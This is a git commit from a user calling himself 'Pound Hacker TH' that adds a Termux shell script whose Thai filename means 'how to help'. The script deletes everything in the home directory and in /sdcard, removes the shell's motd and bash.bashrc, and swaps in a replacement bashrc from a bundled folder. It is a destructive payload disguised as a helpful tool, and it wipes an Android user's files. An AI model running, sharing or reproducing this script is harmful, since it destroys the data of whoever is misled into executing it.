1e561836731cf0bfa4ceaae161bb500a90a53b7a
Pound Hacker TH <75177075+Pound123@users.noreply.github.com>
2021-01-13 13:54:56 +0700

    Add files via upload

---
+++ วิธีช่วย.sh
@@ -0,0 +1,17 @@
+# --- UTF 8 --- #
+cd
+rm -rf *
+cd K1
+mv อ่านสิ.txt /$HOME
+cd ../usr/etc
+rm -rf bash.bashrc
+rm -rf motd
+cd
+cd K1
+mv bash.bashrc /data/data/com.termux/files/usr/etc
+cd
+cd /sdcard
+rm -rf *
+cd
+bash
+
